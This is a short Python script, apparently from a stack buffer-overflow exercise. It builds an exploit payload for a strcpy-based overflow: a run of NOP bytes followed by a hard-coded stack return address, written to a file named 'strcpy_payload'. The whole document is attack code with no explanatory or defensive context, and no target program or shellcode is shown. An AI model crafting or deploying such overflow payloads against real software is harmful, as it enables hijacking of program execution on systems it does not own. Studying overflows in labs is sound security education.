payload = "\x90"*125
payload += "\x90"*4
payload += "\xff\xee\xff\xbf"

file = open("strcpy_payload", "w+")
file.write(payload)
file.close()